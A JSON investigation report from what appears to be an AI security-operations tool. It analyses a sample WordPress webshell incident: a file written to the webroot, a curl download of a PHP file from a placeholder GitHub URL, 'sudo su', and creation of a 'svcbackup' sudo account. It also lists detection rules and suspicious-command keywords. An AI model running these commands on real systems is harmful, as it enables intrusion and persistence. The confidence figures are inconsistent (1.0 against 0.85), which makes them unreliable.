@@ -1,0 +1,482 @@
+{
+  "incident_id": "INC-7d29ffde",
+  "investigation_id": "INV-INC-7d29ffde-20260927-001",
+  "investigation_status": "COMPLETE",
+  "timestamp": "2026-09-27T12:14:53Z",
+  "initial_seed": {
+    "incident_id": "INC-7d29ffde",
+    "host": "ip-10-0-7-236",
+    "src_ip": null,
+    "window": [
+      "2026-09-14T23:45:10.122Z",
+      "2026-09-14T23:50:02.015Z"
+    ],
+    "trigger_time": "2026-09-14T23:45:10.122Z",
+    "evidence_refs": [
+      "sample_audit.log:6",
+      "sample_audit.log:11",
+      "sample_audit.log:16",
+      "sample_auth.log:5",
+      "sample_audit.log:21"
+    ],
+    "trigger_description": "Web Process Writes Executable Script Into Webroot / Web Process Executes Reconnaissance/Exploitation Command Without Interactive Session / Web Process Attempts Privilege Escalation / Login-Capable Account Created Or Login Shell Enabled / Account Creation or Cron Modification Without Interactive Session",
+    "severity_hint": "CRITICAL",
+    "detection": {
+      "entity": {
+        "type": "pid",
+        "value": "1200"
+      },
+      "layers": [
+        "auth",
+        "system"
+      ],
+      "member_count": 5,
+      "oversized": false,
+      "join_types": {
+        "audit_lineage": 3,
+        "system_auth": 1
+      },
+      "rules": [
+        {
+          "rule_name": "audit_webroot_php_write",
+          "reason": "Web Process Writes Executable Script Into Webroot",
+          "layer": "system",
+          "severity": "high",
+          "evidence_refs": [
+            "sample_audit.log:6"
+          ],
+          "detail": {
+            "timestamp": "2026-09-14T23:45:10.122Z",
+            "pid": 1200,
+            "ppid": 1000,
+            "uid": 33,
+            "user": "www-data",
+            "comm": "php-fpm8.1",
+            "exe": "/usr/sbin/php-fpm8.1",
+            "path": "/var/www/html/wp-content/plugins/cache-optimizer-a5d5/is.php",
+            "cwd": "/"
+          }
+        },
+        {
+          "rule_name": "audit_webshell_recon",
+          "reason": "Web Process Executes Reconnaissance/Exploitation Command Without Interactive Session",
+          "layer": "system",
+          "severity": "critical",
+          "evidence_refs": [
+            "sample_audit.log:11"
+          ],
+          "detail": {
+            "timestamp": "2026-09-14T23:45:12.300Z",
+            "pid": 5310,
+            "ppid": 1200,
+            "uid": 33,
+            "user": "www-data",
+            "comm": "sh",
+            "exe": "/usr/bin/dash",
+            "exec_args": "sh -c curl -s https://raw.githubusercontent.com/example/repo/main/123.php -o is.php",
+            "path": "/usr/bin/dash",
+            "cwd": "/var/www/html/wp-content/plugins/cache-optimizer-a5d5"
+          }
+        },
+        {
+          "rule_name": "audit_web_priv_esc",
+          "reason": "Web Process Attempts Privilege Escalation",
+          "layer": "system",
+          "severity": "critical",
+          "evidence_refs": [
+            "sample_audit.log:16"
+          ],
+          "detail": {
+            "timestamp": "2026-09-14T23:49:30.700Z",
+            "pid": 5320,
+            "ppid": 1200,
+            "uid": 33,
+            "user": "www-data",
+            "comm": "sudo",
+            "exe": "/usr/bin/sudo",
+            "exec_args": "sudo su",
+            "path": "/usr/bin/sudo",
+            "cwd": "/var/www/html/wp-content/plugins/cache-optimizer-a5d5"
+          }
+        },
+        {
+          "rule_name": "audit_webshell_recon",
+          "reason": "Web Process Executes Reconnaissance/Exploitation Command Without Interactive Session",
+          "layer": "system",
+          "severity": "critical",
+          "evidence_refs": [
+            "sample_audit.log:16"
+          ],
+          "detail": {
+            "timestamp": "2026-09-14T23:49:30.700Z",
+            "pid": 5320,
+            "ppid": 1200,
+            "uid": 33,
+            "user": "www-data",
+            "comm": "sudo",
+            "exe": "/usr/bin/sudo",
+            "exec_args": "sudo su",
+            "path": "/usr/bin/sudo",
+            "cwd": "/var/www/html/wp-content/plugins/cache-optimizer-a5d5"
+          }
+        },
+        {
+          "rule_name": "auth_login_account_created",
+          "reason": "Login-Capable Account Created Or Login Shell Enabled",
+          "layer": "auth",
+          "severity": "high",
+          "evidence_refs": [
+            "sample_auth.log:5"
+          ],
+          "detail": {
+            "timestamp": "2026-09-14T23:50:02.000Z",
+            "pid": 5501,
+            "ppid": null,
+            "uid": 1002,
+            "user": "svcbackup",
+            "event": "user_created"
+          }
+        },
+        {
+          "rule_name": "audit_persistence_account_cron",
+          "reason": "Account Creation or Cron Modification Without Interactive Session",
+          "layer": "system",
+          "severity": "high",
+          "evidence_refs": [
+            "sample_audit.log:21"
+          ],
+          "detail": {
+            "timestamp": "2026-09-14T23:50:02.015Z",
+            "pid": 5501,
+            "ppid": 5320,
+            "uid": 0,
+            "user": "root",
+            "comm": "useradd",
+            "exe": "/usr/sbin/useradd",
+            "exec_args": "useradd -m -G sudo svcbackup",
+            "path": "/usr/sbin/useradd",
+            "cwd": "/root"
+          }
+        }
+      ]
+    }
+  },
+  "raw_refs": [
+    "sample_audit.log:6",
+    "sample_audit.log:11",
+    "sample_audit.log:16",
+    "sample_auth.log:5",
+    "sample_audit.log:21",
+    "sample_audit.log:7",
+    "sample_audit.log:8",
+    "sample_audit.log:9",
+    "sample_audit.log:10",
+    "sample_audit.log:12",
+    "sample_audit.log:13",
+    "sample_audit.log:14",
+    "sample_audit.log:15",
+    "sample_audit.log:17",
+    "sample_audit.log:18",
+    "sample_audit.log:19",
+    "sample_audit.log:20"
+  ],
+  "raw_ref_locations": {
+    "sample_audit.log:6": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:6"
+    ],
+    "sample_audit.log:7": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:7"
+    ],
+    "sample_audit.log:8": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:8"
+    ],
+    "sample_audit.log:9": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:9"
+    ],
+    "sample_audit.log:10": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:10"
+    ],
+    "sample_audit.log:11": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:11"
+    ],
+    "sample_audit.log:12": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:12"
+    ],
+    "sample_audit.log:13": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:13"
+    ],
+    "sample_audit.log:14": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:14"
+    ],
+    "sample_audit.log:15": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:15"
+    ],
+    "sample_audit.log:16": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:16"
+    ],
+    "sample_audit.log:17": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:17"
+    ],
+    "sample_audit.log:18": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:18"
+    ],
+    "sample_audit.log:19": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:19"
+    ],
+    "sample_audit.log:20": [
+      "D:/2026/WHS/Agentic-SOC/Agentic-SOC/primary_detection/normalizer/samples/sample_audit.log:20"
+    ]
+  },
+  "provenance": {
+    "status": "passed",
+    "raw_ref_count": 17,
+    "seed_raw_refs": [
+      "sample_audit.log:6",
+      "sample_audit.log:11",
+      "sample_audit.log:16",
+      "sample_auth.log:5",
+      "sample_audit.log:21"
+    ],
+    "evidence_without_raw_refs": [],
+    "empty_result_evidence": [
+      "EVID-002"
+    ],
+    "ambiguous_raw_refs": {},
+    "issues": []
+  },
+  "hypothesis": {
+    "title": "웹 취약점을 통한 웹셸 업로드 및 권한 상승, 지속성 확보",
+    "description": "www-data 권한으로 웹루트에 PHP 스크립트를 작성하고 외부에서 파일을 다운로드한 뒤, sudo 권한 상승을 통해 백도어 계정을 생성한 침해 정황",
+    "confidence_initial": 0.5
+  },
+  "evidence_chain": [
+    {
+      "sequence": 1,
+      "time": "2026-09-14T23:45:10.122Z",
+      "layer": "process",
+      "event_type": "audit_webroot_php_write",
+      "description": "www-data 계정(php-fpm8.1, pid 1200)이 웹루트 /var/www/html/wp-content/plugins/cache-optimizer-a5d5/is.php 파일을 생성한 감사 기록 확인",
+      "evidence_id": "EVID-001",
+      "supporting_hypothesis": [
+        "H1"
+      ],
+      "confidence_contribution": 0.15,
+      "source_log": "sample_audit.log",
+      "raw_ref": "sample_audit.log:6",
+      "raw_refs": [
+        "sample_audit.log:6",
+        "sample_audit.log:7",
+        "sample_audit.log:8",
+        "sample_audit.log:9",
+        "sample_audit.log:10"
+      ],
+      "empty_result_call": null
+    },
+    {
+      "sequence": 2,
+      "time": null,
+      "layer": "web",
+      "event_type": "web_log_missing",
+      "description": "fetch_web_log 조회 결과 해당 구간에 웹 로그 기록이 존재하지 않아 원본 로그를 확보하지 못함",
+      "evidence_id": "EVID-002",
+      "supporting_hypothesis": [],
+      "confidence_contribution": 0.0,
+      "source_log": "sample_web.log",
+      "raw_ref": null,
+      "raw_refs": [],
+      "empty_result_call": 2
+    },
+    {
+      "sequence": 3,
+      "time": "2026-09-14T23:45:12.300Z",
+      "layer": "process",
+      "event_type": "exec",
+      "description": "www-data 계정이 sh -c curl -s https://raw.githubusercontent.com/example/repo/main/123.php -o is.php 명령을 실행하여 외부 파일을 다운로드함",
+      "evidence_id": "EVID-003",
+      "supporting_hypothesis": [
+        "H1"
+      ],
+      "confidence_contribution": 0.2,
+      "source_log": "sample_audit.log",
+      "raw_ref": "sample_audit.log:11",
+      "raw_refs": [
+        "sample_audit.log:11",
+        "sample_audit.log:12",
+        "sample_audit.log:13",
+        "sample_audit.log:14",
+        "sample_audit.log:15"
+      ],
+      "empty_result_call": null
+    },
+    {
+      "sequence": 4,
+      "time": "2026-09-14T23:49:30.700Z",
+      "layer": "process",
+      "event_type": "exec",
+      "description": "www-data 계정이 sudo su 명령을 실행하여 권한 상승을 시도함",
+      "evidence_id": "EVID-004",
+      "supporting_hypothesis": [
+        "H1"
+      ],
+      "confidence_contribution": 0.2,
+      "source_log": "sample_audit.log",
+      "raw_ref": "sample_audit.log:16",
+      "raw_refs": [
+        "sample_audit.log:16",
+        "sample_audit.log:17",
+        "sample_audit.log:18",
+        "sample_audit.log:19",
+        "sample_audit.log:20"
+      ],
+      "empty_result_call": null
+    }
+  ],
+  "contradicting_evidence": [],
+  "attack_timeline": [
+    {
+      "time": "2026-09-14T23:45:10.122Z",
+      "event": "www-data 계정(php-fpm8.1, pid 1200)이 웹루트에 파일 생성",
+      "source": "www-data"
+    },
+    {
+      "time": "2026-09-14T23:45:12.300Z",
+      "event": "www-data 계정이 외부에서 스크립트 파일을 다운로드하는 명령 실행",
+      "source": "www-data"
+    },
+    {
+      "time": "2026-09-14T23:49:30.700Z",
+      "event": "www-data 계정이 sudo su 명령을 통해 권한 상승 시도",
+      "source": "www-data"
+    }
+  ],
+  "confidence_progression": [
+    {
+      "stage": "initial",
+      "confidence": 0.5,
+      "reason": "Web Process Writes Executable Script Into Webroot / Web Process Executes Reconnaissance/Exploitation Command Without Interactive Session / Web Process Attempts Privilege Escalation / Login-Capable Account Created Or Login Shell Enabled / Account Creation or Cron Modification Without Interactive Session"
+    },
+    {
+      "stage": "after_tool_1",
+      "confidence": 0.65,
+      "reason": "www-data 계정(php-fpm8.1, pid 1200)이 웹루트 /var/www/html/wp-content/plugins/cache-optimizer-a5d5/is.php 파일을 생성한 감사 기록 확인"
+    },
+    {
+      "stage": "after_tool_2",
+      "confidence": 0.65,
+      "reason": "fetch_web_log 조회 결과 해당 구간에 웹 로그 기록이 존재하지 않아 원본 로그를 확보하지 못함"
+    },
+    {
+      "stage": "after_tool_3",
+      "confidence": 0.85,
+      "reason": "www-data 계정이 sh -c curl -s https://raw.githubusercontent.com/example/repo/main/123.php -o is.php 명령을 실행하여 외부 파일을 다운로드함"
+    },
+    {
+      "stage": "after_tool_3",
+      "confidence": 1.0,
+      "reason": "www-data 계정이 sudo su 명령을 실행하여 권한 상승을 시도함"
+    }
+  ],
+  "final_verdict": {
+    "verdict": "THREAT_CONFIRMED",
+    "confidence": 0.85,
+    "severity": "HIGH",
+    "attack_type": "웹셸 업로드 및 권한 상승",
+    "affected_systems": [
+      "ip-10-0-7-236"
+    ],
+    "summary": "웹 프로세스를 통한 스크립트 파일 작성 및 외부 파일 다운로드, 권한 상승 명령 실행 등의 명확한 침해 정황이 시스템 감사 로그를 통해 확인되었습니다.",
+    "reasoning": "시스템 감사 로그(audit)를 통해 www-data 웹 프로세스가 웹루트에 파일을 생성하고 외부 URL로부터 파일을 다운로드한 뒤, sudo su를 통해 권한 상승을 시도한 사실을 확인하여 침해로 판정함"
+  },
+  "tools_called": [
+    {
+      "sequence": 1,
+      "tool_name": "fetch_audit_log",
+      "input": {
+        "host": "ip-10-0-7-236",
+        "start_time": "2026-09-14T23:15:10Z",
+        "end_time": "2026-09-15T00:50:02Z",
+        "pid": 1200
+      },
+      "result_count": 1,
+      "result_summary": "ip-10-0-7-236의 2026-09-14T23:15:10Z~2026-09-15T00:50:02Z 구간에서 조건에 맞는 audit 이벤트 총 1건 중 0~0번째 1건 반환. (더 없음, uid/euid/session_type/exec_args까지 구조화, 1차 탐지팀 공통 정규화 함수 사용) [조회 구간 전체 집계] 이벤트 1건(실제 기록 시각 2026-09-14T23:45:10.122Z~2026-09-14T23:45:10.122Z), 실행 계정별: www-data 1건, 명령별: php-fpm8.1 1건. [후속 침해 확인] 웹 서버 계정(www-data/apache/nginx/http) 실행 1건 중 셸·의심 명령 0건, 전체 의심 명령(curl/wget//dev/tcp/crontab 등, EC2 Instance Connect 제외) 0건. (페이지와 무관한 전체 기준. 0건이 아니면 user나 pid로 다시 조회해 원본을 확인하십시오)",
+      "raw_refs": [
+        "sample_audit.log:6",
+        "sample_audit.log:7",
+        "sample_audit.log:8",
+        "sample_audit.log:9",
+        "sample_audit.log:10"
+      ],
+      "queried_layers": []
+    },
+    {
+      "sequence": 2,
+      "tool_name": "fetch_web_log",
+      "input": {
+        "host": "ip-10-0-7-236",
+        "start_time": "2026-09-14T22:45:10Z",
+        "end_time": "2026-09-15T00:50:02Z",
+        "path": "/wp-content/plugins/cache-optimizer-a5d5/is.php"
+      },
+      "result_count": 0,
+      "result_summary": "ip-10-0-7-236의 2026-09-14T22:45:10Z~2026-09-15T00:50:02Z 구간에서 조건에 맞는 web 요청을 찾지 못했습니다. host 이름, 기간, 또는 WEB_LOG_LOCAL_PATH 설정을 확인하세요. 이 구간에는 이 계층의 로그 기록 자체가 없습니다(수집 누락·로그 교체 가능). '활동이 없었다'는 증거로 쓰지 말고 unknowns에 '원본 로그 미확보'로 남기십시오.",
+      "raw_refs": [],
+      "queried_layers": []
+    },
+    {
+      "sequence": 3,
+      "tool_name": "fetch_audit_log",
+      "input": {
+        "host": "ip-10-0-7-236",
+        "start_time": "2026-09-14T23:45:00Z",
+        "end_time": "2026-09-14T23:51:00Z",
+        "ppid": 1200
+      },
+      "result_count": 2,
+      "result_summary": "ip-10-0-7-236의 2026-09-14T23:45:00Z~2026-09-14T23:51:00Z 구간에서 조건에 맞는 audit 이벤트 총 2건 중 0~1번째 2건 반환. (더 없음, uid/euid/session_type/exec_args까지 구조화, 1차 탐지팀 공통 정규화 함수 사용) [조회 구간 전체 집계] 이벤트 2건(실제 기록 시각 2026-09-14T23:45:12.300Z~2026-09-14T23:49:30.700Z), 실행 계정별: www-data 2건, 명령별: sh 1건, sudo 1건. [후속 침해 확인] 웹 서버 계정(www-data/apache/nginx/http) 실행 2건 중 셸·의심 명령 1건, 전체 의심 명령(curl/wget//dev/tcp/crontab 등, EC2 Instance Connect 제외) 1건 — 예: www-data: sh -c curl -s https://raw.githubusercontent.com/example/repo/main/123.php -o is. (sample_audit.log:11). (페이지와 무관한 전체 기준. 0건이 아니면 user나 pid로 다시 조회해 원본을 확인하십시오)",
+      "raw_refs": [
+        "sample_audit.log:11",
+        "sample_audit.log:12",
+        "sample_audit.log:13",
+        "sample_audit.log:14",
+        "sample_audit.log:15",
+        "sample_audit.log:16",
+        "sample_audit.log:17",
+        "sample_audit.log:18",
+        "sample_audit.log:19",
+        "sample_audit.log:20"
+      ],
+      "queried_layers": []
+    },
+    {
+      "sequence": 4,
+      "tool_name": "fetch_network_log",
+      "input": {
+        "host": "ip-10-0-7-236",
+        "start_time": "2026-09-14T23:15:10Z",
+        "end_time": "2026-09-15T00:20:02Z",
+        "ip": "raw.githubusercontent.com"
+      },
+      "result_count": 0,
+      "result_summary": "ip-10-0-7-236의 2026-09-14T23:15:10Z~2026-09-15T00:20:02Z 구간에서 조건에 맞는 네트워크 이벤트를 찾지 못했습니다. host 이름, 기간, 또는 NETWORK_LOG_LOCAL_PATH 설정을 확인하세요. 이 구간 전체 3건은 다른 대상의 이벤트이며, ip 조건에 해당하는 이벤트는 없습니다 — '이 계층에서 해당 IP의 활동 없음'으로 기록하면 됩니다.",
+      "raw_refs": [],
+      "queried_layers": []
+    }
+  ],
+  "statistics": {
+    "tool_calls_count": 4,
+    "tool_calls_max": 8,
+    "confidence_increase": 0.5,
+    "investigation_confidence": 1.0,
+    "evidence_count": 4,
+    "contradicting_evidence_count": 0,
+    "termination_reason": "confidence_sufficient"
+  },
+  "remaining_unknowns": [
+    "원본 로그 미확보"
+  ],
+  "investigation_notes": [
+    "웹 서버 access 로그가 확보되지 않았으므로 audit 로그를 통해 자식 프로세스 및 권한 상승 행위를 집중 분석함",
+    "네트워크 로그 조회를 통해 외부 다운로드 목적지 IP와의 통신 내역을 확인하고 추가 조사를 마무리할 예정입니다.",
+    "신뢰도 임계값 도달 — 다음 사이클에서 종료 여부 재확인 필요"
+  ]
+}
